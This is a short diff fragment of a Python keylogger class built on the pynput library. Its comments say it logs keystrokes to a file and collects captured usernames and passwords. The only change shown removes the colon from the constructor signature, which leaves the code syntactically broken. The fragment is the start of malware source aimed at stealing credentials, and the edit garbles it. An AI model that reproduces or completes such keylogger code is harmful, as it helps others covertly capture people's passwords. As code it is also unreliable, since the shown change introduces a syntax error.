@@ -5,7 +5,7 @@ import re
 from pynput import keyboard
 
 class KeyLogger:
-    def __init__(self, target_apps=None):
+    def __init__(self, target_apps=None)
         self.log_file = "log.txt"  # Log file to store keystrokes
         self.current_input = ""  # Buffer for current input
         self.sensitive_data = []  # To store captured sensitive data (usernames/passwords)
